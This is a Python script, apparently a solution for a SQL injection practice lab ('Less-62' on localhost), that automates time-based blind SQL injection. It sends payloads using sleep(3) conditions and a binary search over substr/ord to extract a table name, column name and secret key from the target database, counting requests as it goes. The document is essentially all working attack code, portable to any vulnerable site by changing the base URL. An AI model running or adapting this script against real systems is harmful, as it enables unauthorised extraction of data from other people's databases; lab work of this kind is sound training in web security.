# -*- coding: utf-8 -*-
"""
Created on Wed Jan 27 14:04:40 2021

@author: ASUS
"""

import requests


get_table = "(select table_name from information_schema.tables where table_schema= database() limit 0,1)"
get_column = "(select column_name from information_schema.columns where table_name = '{0}' limit 3,1)"
get_secret = "(select {0} from {1} )"
base_url = "http://localhost:1234/Less-62/?id=1"
session = requests.Session()
number_of_request = 0
def getsize(find):
    leng=0
    payload = base_url + "' and if((length({0})={1}),sleep(3),null) --+"
    number_of_request = 0
    for i in range(1,100):
        url = payload.format(find,i)
        response = requests.get(url)
        number_of_request += 1
        time = response.elapsed.total_seconds()
        if (time > 3):
            leng = i
            print("Length :",leng)
            break
    return leng

def getname(leng,find):
     payload = base_url + "' and if((ord(substr({0},{1},1))>={2}),sleep(3),null) --+" 
     name=""
     number_of_request = 0
     for i in range(1,leng):
         mini=48
         maxi=128
         while(maxi>mini):
             mid=int((maxi+mini)/2)
             url=payload.format(find,i,mid)
             response = requests.get(url)
             number_of_request += 1
             time = response.elapsed.total_seconds()
             if (time > 3):
                 if(maxi-mini>1):
                     mini=mid
                 else:
                     maxi=mini
             else:
                maxi=mid
         name += chr(mid)
     print("Number : ",number_of_request)
     return name
length = getsize(get_table)+1
table_name = getname(length,get_table)
print("Tablename : ",table_name)

length = getsize(get_column.format(table_name))+1
column_name = getname(length,get_column.format(table_name))
print("Column Name : ",column_name)

length = getsize(get_secret.format(column_name,table_name))+1
secret_key = getname(length,get_secret.format(column_name,table_name))
print("Secret Key : ",secret_key)